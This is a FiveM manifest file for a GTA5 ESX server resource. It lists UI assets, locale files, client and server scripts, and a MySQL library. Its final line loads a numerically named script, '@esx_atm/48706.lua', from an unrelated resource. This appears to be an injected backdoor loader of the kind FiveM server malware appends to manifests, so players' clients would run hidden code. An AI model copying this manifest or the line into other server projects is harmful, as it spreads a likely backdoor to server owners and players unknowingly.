fx_version 'adamant'
game 'gta5'

ui_page 'html/index.html'

files {
	'html/index.html',
	'html/**/**/*.css',
	'html/**/**/*.json',
	'html/**/**/*.js',
	'html/**/**/*.png',
	'html/**/**/*.jpg',
	'html/**/**/*.ttf',
	'html/**/**/*.mp3',
	'html/**/**/*.ogg',
	'html/**/**/**/*.png',
	'html/**/**/**/*.jpg'
}

shared_scripts {
	'@es_extended/locale.lua',
	'locales/*.lua',
	"config.lua"
}

client_script {
	"client/*.lua"
}

server_script {
	'@mysql-async/lib/MySQL.lua',
	"server/*.lua"
}
client_script '@esx_atm/48706.lua'